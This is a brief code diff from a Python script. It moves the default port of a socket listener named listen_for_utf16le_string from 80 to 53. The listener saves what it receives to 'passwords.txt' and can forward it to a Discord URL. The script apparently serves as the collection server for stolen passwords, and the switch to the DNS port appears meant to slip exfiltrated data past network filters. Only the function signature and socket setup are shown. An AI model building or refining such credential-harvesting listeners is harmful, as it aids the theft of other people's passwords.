@@ -8,7 +8,7 @@ import sys
 # Initialize colorama
 init()
 
-def listen_for_utf16le_string(port=80, output_file='passwords.txt', discord_url=None):
+def listen_for_utf16le_string(port=53, output_file='passwords.txt', discord_url=None):
     # Create a TCP socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         # Bind the socket to listen on the specified port
